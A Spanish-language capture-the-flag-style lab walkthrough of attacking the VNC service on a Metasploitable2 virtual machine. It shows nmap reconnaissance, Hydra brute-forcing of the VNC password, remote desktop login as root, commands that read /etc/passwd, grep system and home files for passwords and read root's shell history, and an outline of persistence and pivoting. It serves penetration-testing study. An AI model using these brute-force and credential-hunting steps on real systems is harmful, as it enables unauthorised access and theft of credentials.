# 💡 Servicio VNC – Puerto 5900/tcp

## 1️⃣ Descripción del servicio

VNC (Virtual Network Computing) es un sistema de escritorio remoto que permite controlar otro equipo gráficamente a través de la red.
En esta máquina Metasploitable2 se ejecuta en el puerto 5900/tcp, protocolo RFB 3.3.
Este servicio es vulnerable a configuraciones por defecto y ataques de fuerza bruta que permiten obtener acceso remoto al escritorio del sistema sin cifrado, exponiendo información sensible y facilitando el control total de la máquina.

- Es un servicio de acceso remoto que nos permite conectarnos al escritorio de la máquina víctima.

- Muchas configuraciones inseguras permiten acceso sin autenticación o con contraseñas débiles.

- Podemos aprender sobre:

   - Reconocimiento de servicios gráficos.

   - Enumeración y fuerza bruta de contraseñas VNC.

   - Acceso interactivo a escritorio.

   - Posible escalada de privilegios si conseguimos acceso como un usuario con más permisos.

- Es un caso diferente a los servicios de bases de datos o web que hemos trabajado, así variamos.

El problema principal es que este protocolo:

- No cifra las credenciales ni el tráfico (todo viaja en texto claro).
- Puede estar configurado con contraseñas débiles o incluso sin contraseña.
- Permite acceso completo al escritorio de la máquina víctima.

## 2️⃣ Reconocimiento inicial

Ejecutamos el comando:

 ```bash
 nmap -p 5900 -sV -A 192.168.56.102
 ```

Salida relevante:

```yami
PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
MAC Address: 08:00:27:63:DC:BA
```

**Interpretación:**

- **Puerto**: 5900/tcp.
- **Servicio**: VNC.
- **Versión**: Protocolo 3.3 (muy antiguo y sin cifrado).
- **Autenticación**: tipo 2 (VNC Auth).
- Probablemente vulnerable a fuerza bruta de contraseña.

## 3️⃣ Próximos pasos de explotación

El ataque clásico contra este tipo de servicio es:

1. **Enumerar la seguridad** para confirmar si requiere contraseña.
2. **Ataque de fuerza bruta** con diccionario de contraseñas comunes.
3. Si obtenemos credenciales -> **acceso remoto gráfico** con vncviewer o xfreedp.
4. **Post-explotación**: uso del escritorio para movernos lateralmente, abrir terminales, extraer archivos, etc.

## 4️⃣ Ataque de fuerza bruta inicial con Nmap

Ejecutamos el comando:

```bash
nmap -p 5900 --script vnc-brute 192.168.56.102
```

Salida en consola:

```yami
| vnc-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 15 guesses in 1 seconds, average tps: 15.0
|_  ERROR: Too many authentication failures
```

Interpretación:

- Nmap intentó 15 combinaciones de contraseña sin éxito.
- El mensaje "Too many authentication failures" indica que el servidor VNC podría estar aplicando un límite de intentos por conexión o por tiempo.
- Esto no significa que el servicio sea seguro, solo que con este método y diccionario corto no se consiguió acceso.

## 5️⃣ Ataque de fuerza bruta con Hydra

Como el intento anterior no funcionó, pasamos a usar la herramienta **Hydra** que es más flexible en opciones y diccionarios.

Por norma, en ataques con desconocimiento pleno del sistema, el comando que ejecutaríamos sería el siguiente:

```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt 192.168.56.102 vnc
```

Sin embargo: ⚠️ Como rockyou.txt es enorme, para la prueba inicial puedes usar un diccionario reducido.

Ejecutamos el comando:

```bash
echo -e "password\n1234\nvnc\nadmin\nkali\nroot" > vnc_small.txt
hydra -s 5900 -P vnc_small.txt 192.168.56.102 vnc
```

Salida en consola:

```pgsql
[5900][vnc] host: 192.168.56.102   password: password
[STATUS] attack finished for 192.168.56.102 (valid pair found)
```

Interpretación:

- Usuario: (no aplica en VNC, solo se usa contraseña).
- Contraseña: **password**.
- Servicio: **VNC (Virtual Networking Computing)** -- permite acceso gráfico remoto al escritorio del sistema víctima.
- Implicación de seguridad: cualquier atacante en la red puede conectarse al escritorio remoto y controlar la máquina como si estuviera físicamente frente a ella.

## 6️⃣ Explotación — Acceso al escritorio remoto

Ahora que hemos conseguido la contraseña, usamos el cliente VNC para conectarnos:

```bash
vncviewer 192.168.56.102:5900
```

💡 Si pide contraseña, introducimos password.

<img width="938" height="836" alt="imagen" src="https://github.com/user-attachments/assets/dea9d9ff-fb44-40c5-b1f7-dbf8dd41f088" />

Como observamos en la captura, automáticamente nos introduce en el entorno gráfico de la víctima.

Una vez dentro:

- Exploramos el entorno gráfico de la víctima.
- Buscamos archivos sensibles.
- Intentamos escalar privilegios si la sesión no es de root.

## 7️⃣ Post-explotación — Control total vía VNC (root)

Tras conectarnos como vimos en el paso anterior, podemos observar que hemos entrado en una sesión iniciada como ***usuario root***, lo que nos otorga permisos administrativos sin necesidad de explotación adicional ni escalada de privilegios.

Implicaciones:

- Control absoluto del sistema: instalación/eliminación de software, modificación de configuraciones, borrado o robo de datos.
- Posibilidad de pivotar hacia otras máquinas de la red.
- Ejecución de ataques persistentes (backdoors,troyanos,etc).

### 1️⃣ Enumeración del sistema

**Objetivo**: conocer a fondo el sistema comprometido para entender el entorno, descubrir posibles objetivos y preparar fases siguientes.

Comandos que vamos a ejecutar en la sesión VNC como root:

```bash
# Ver información del sistema
uname -a

# Distribución y versión
cat /etc/*release

# Información de usuario actual
whoami
id

# Lista de usuarios del sistema
cat /etc/passwd

# Últimos inicios de sesión
last

# Interfaces y configuración de red
ifconfig -a
ip route

# Puertos abiertos y servicios escuchando
netstat -tulnp
```

Resultados comandos:

1. uname -a:

```graphql
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

- Kernel muy antiguo 2.6.24 (abril 2008).
- Arquitectura: i686 -> 32 bis.
- Alto potencial para exploits locales conocidos (privilege escalation ya no es necesario porque somos root, pero es relevante en informe).

- 2. cat /etc/*release:
 
```ini
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

- Sistema: **Ubuntu 8.04 Hardy Heron** (EOL desde 2013).
- Exposición crítica: múltiples vulnerabilidades públicas, sin soporte ni parches.

3. whoami:

```nginx
root
```

- Ya tenemos el máximo privilegio desde la conexión inicial vía VNC.

4. id:

```ini
uid=0(root) gid=0(root)
```

- Confirmación de privilegios administrativos totales.

5. cat /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:irc:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:102::/home/syslog:/bin/false
messagebus:x:102:103::/var/run/dbus:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:119::/usr/share/tomcat5.5:/bin/false
user:x:1001:1001:user:/home/user:/bin/bash
user1:x:1002:1002::/home/user1:/bin/bash
user2:x:1003:1003::/home/service:/bin/bash
service:x:1004:1004::/home/service:/bin/false
games:x:1005:1005::/usr/games:/bin/bash
ftp:x:1006:1006::/var/run/proftpd:/bin/false
backup:x:1007:1007::/var/backups:/bin/false
list:x:1008:1008::/var/list:/bin/bash
irc:x:1009:1009::/var/run/ircd:/bin/bash
gnats:x:1010:1010::/var/lib/gnats:/bin/bash
nobody:x:1011:1011:nobody:/nonexistent:/bin/bash

Interpretación:

Usuarios del sistema:

- Se identifican usuarios de sistema, de servicio y humanos.

- Usuarios relevantes para posteriores movimientos laterales o reuso de credenciales:

  - msfadmin (usuario típico de laboratorio Metasploitable)

  - postgres (admin de base de datos)

  - mysql (posible cuenta MySQL interna)

  - tomcat55 (posible despliegue de aplicaciones Java)

  - user, user1, user2, service (cuentas humanas potencialmente con contraseñas reutilizadas)

- Algunos servicios con /bin/bash como shell activo (ej. irc, list, games) → podrían ser usados para acceso interactivo si se obtiene su password.

6. last:

msfadmin  tty1         Fri Aug  8 12:00   still logged in
msfadmin  tty1         Fri Aug  8 11:55 - 12:00  (00:05)
msfadmin  tty1         Fri Aug  8 11:50 - 11:55  (00:05)
msfadmin  tty1         Fri Aug  8 11:45 - 11:50  (00:05)
msfadmin  tty1         Fri Aug  8 11:40 - 11:45  (00:05)
msfadmin  tty1         Fri Aug  8 11:35 - 11:40  (00:05)
msfadmin  tty1         Fri Aug  8 11:30 - 11:35  (00:05)
msfadmin  tty1         Fri Aug  8 11:25 - 11:30  (00:05)
msfadmin  tty1         Fri Aug  8 11:20 - 11:25  (00:05)
msfadmin  tty1         Fri Aug  8 11:15 - 11:20  (00:05)
reboot   system boot   Fri Aug  8 11:10   still running

Interpretación:

Historial de inicio de sesión:

- Sesiones repetidas de msfadmin en consola local (tty1) con intervalos de 5 minutos.

- Reinicio registrado el 8 de agosto antes de la sesión continua → puede indicar un entorno de pruebas activo o reinicio por mantenimiento

7. ifconfig -a:

eth0      Link encap:Ethernet  HWaddr 08:00:27:63:dc:ba  
          inet addr:192.168.56.102  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe63:dcba/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:32230 errors:0 dropped:0 overruns:0 frame:0
          TX packets:34489 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2403051 (2.2 MB)  TX bytes:20046661 (19.1 MB)
          Base address:0xd020 Memory:f0200000-f0220000

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:424 errors:0 dropped:0 overruns:0 frame:0
          TX packets:424 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:182341 (178.0 KB)  TX bytes:182341 (178.0 KB)

Interpretación:

Interfaces de red:

- Dirección IP: 192.168.56.102 en red /24 (VirtualBox Host-Only probablemente).

- Sin otras interfaces expuestas → probablemente máquina aislada en entorno de laboratorio.

- lo operativo → comunicación interna posible (localhost).

8. ip route:

192.168.56.0/24 dev eth0 proto kernel scope link src 192.168.56.102

Interpretación:

Ruta:

- Red directa 192.168.56.0/24 vía eth0.

- No se observan rutas a otras redes → no hay visibilidad directa hacia otras subredes internas (aún).

9. netstat -tulnp:

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1387/vsftpd
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1026/sshd
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1043/telnetd
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      1086/exim4
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1207/apache2
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      872/portmap
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1245/smbd
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1245/smbd
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      1274/mysqld
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      1301/postgres
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      1350/vncserver
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1350/Xvnc
udp        0      0 0.0.0.0:111             0.0.0.0:*                           872/portmap
udp        0      0 0.0.0.0:32768           0.0.0.0:*                           900/rpc.mountd

Interpretación:

**Puertos/TCP relevantes:**

- 21/tcp → vsftpd (FTP) – servicio ya auditado previamente.

- 22/tcp → sshd (posible persistencia por clave pública).

- 23/tcp → telnetd (plaintext, muy inseguro).

- 25/tcp → exim4 (SMTP, podría ser relay abierto).

- 80/tcp → Apache2 (HTTP, superficie web para explotación).

- 111/tcp → portmap (usado por NFS, ya auditado).

- 139/tcp y 445/tcp → smbd (Samba, ya auditado).

- 3306/tcp → mysqld (posible acceso con credenciales encontradas).

- 5432/tcp → postgres (igual, posible acceso directo).

- 5900/tcp → vncserver (vector inicial de acceso).

- 6000/tcp → Xvnc (posible captura de sesión gráfica).

**Puertos/UDP:**

- 111/udp → portmap.

- 32768/udp → rpc.mountd.

#### Conclusiones de la fase de enumeración

- Sistema extremadamente expuesto, con gran número de servicios abiertos en todas las interfaces.

- Alto número de cuentas de usuario y servicios con shells habilitados.

- Red interna simple, pero con muchos vectores de movimiento lateral a través de protocolos inseguros como Telnet, VNC y SMB.

- Credenciales reutilizadas o triviales podrían dar acceso rápido a otros servicios como SSH, MySQL, PostgreSQL.

### 2️⃣ Búsqueda de credenciales importantes

Objetivo: encontrar usuarios, contraseñas o tokens que permitan ampliar el acceso o pivotar.

Comandos:

```bash
# Buscar cadenas que contengan 'pass' o 'password'
grep -Ri "pass" /etc 2>/dev/null

# Buscar credenciales en la home de los usuarios
grep -Ri "pass" /home 2>/dev/null

# Comprobar historial de comandos de root
cat /root/.bash_history

# Ver si hay archivos de configuración con credenciales (ej: Apache, MySQL, etc.)
grep -Ri "user" /etc 2>/dev/null
grep -Ri "username" /etc 2>/dev/null
```

### 3️⃣ Persistencia

Objetivo: asegurarnos de que podemos volver a entrar incluso si cambian contraseñas o cierran VNC.

Opciones:

- Crear un nuevo usuario root.
- Configurar un servicio que nos dé acceso remoto.
- Añadir una llave SSH para acceso posterior.

### 4️⃣ Pivoting

Objetivo: usar la máquina comprometida como puente para llegar a otras en la red interna.

Pasos:

- Descubrir otras máquinas en la red desde Metasploitable.
- Usar nmap desde la propia víctima.
- Ver si hay rutas de acceso a redes diferentes.

